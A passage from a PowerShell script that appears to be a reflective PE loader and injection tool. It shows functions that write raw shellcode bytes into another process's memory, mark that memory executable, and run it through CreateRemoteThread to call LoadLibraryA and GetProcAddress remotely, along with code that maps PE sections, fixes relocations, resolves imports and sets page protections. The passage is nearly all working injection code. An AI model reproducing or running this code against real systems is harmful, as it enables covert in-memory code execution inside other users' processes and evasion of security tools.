		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
